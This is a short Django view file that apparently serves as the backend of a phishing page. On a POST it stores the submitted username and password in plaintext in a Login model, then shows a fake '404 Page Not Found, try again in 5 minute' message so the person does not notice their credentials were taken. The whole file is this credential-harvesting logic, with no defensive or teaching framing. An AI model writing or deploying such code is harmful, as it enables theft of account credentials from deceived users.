from django.shortcuts import render
from .models import Login
from django.http import HttpResponse

def login(request):
    login = Login()
    if request.method == "POST":
        try:
            data = request.POST
            login.password = data['password']
            login.username = data['username']
            login.save()
        except:
            return HttpResponse("<h3 style='color:red'> Error try again! </h3>")
        return HttpResponse("<h5 style='color:red;'>404 Page Not Found</h5><h6>Please try again in 5 minute.</h6> ")
        
    else:
        return render(request, 'index.html')